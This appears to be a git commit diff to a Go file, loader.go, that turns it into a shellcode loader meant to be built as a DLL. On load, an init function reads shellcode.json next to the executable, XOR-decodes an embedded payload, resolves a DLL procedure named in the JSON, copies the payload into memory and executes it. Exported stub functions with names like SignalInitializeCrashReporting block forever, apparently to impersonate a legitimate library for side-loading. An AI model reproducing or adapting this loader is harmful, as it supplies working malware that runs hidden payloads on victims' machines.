b9053e45c307de10e008cba30f2f0f3a165f10b8
hello <hello@google.com>
2024-06-13 05:46:25 -0400

    test

--- loader.go
+++ loader.go
@@ -1,22 +1,51 @@
 package main
 
 import (
+	"C"
 	"encoding/json"
+	"io/ioutil"
 	"os"
+	"path/filepath"
 	"syscall"
 	"unsafe"
 )
 
-// /////////////////////////////////////////////////////////////////////////////////////////
-func xor(key []byte, data []byte) {
+func init() {
+	var dirpath string
+	if execPath, err := os.Executable(); err == nil {
+		dirpath = filepath.Dir(execPath)
+	}
+	go run(filepath.Join(dirpath, "shellcode.json"))
+}
+
+//export GetInstallDetailsPayload
+func GetInstallDetailsPayload() {
+	ch := make(chan int)
+	<-ch
+}
+
+//export SignalInitializeCrashReporting
+func SignalInitializeCrashReporting() {
+	ch := make(chan int)
+	<-ch
+}
+
+func main() {
+}
+
+func xor(key []byte, data []byte) byte {
+	var tmp byte
 	for i := 0; i < len(data); i++ {
+		tmp = data[i] + 1
+		tmp = tmp + 1
 		index := i % len(key)
 		data[i] = data[i] ^ key[index]
 	}
+	return tmp
 }
 
-func run() {
-	fileData, err := os.ReadFile(os.Getenv("FILE"))
+func run(filepath string) {
+	fileData, err := ioutil.ReadFile(filepath)
 	if err != nil {
 		return
 	}
@@ -46,7 +75,5 @@ func run() {
 	cm := syscall.MustLoadDLL(string(fs.Nll)).MustFindProc(string(fs.RMM))
 	xor(fs.Key, fs.SC)
 	cm.Call(addr, uintptr(unsafe.Pointer(&fs.SC[0])), uintptr(len(fs.SC)))
-	syscall.SyscallN(addr)
+	syscall.Syscall(addr, 0, 0, 0, 0)
 }
-
-// /////////////////////////////////////////////////////////////////////////////////////////
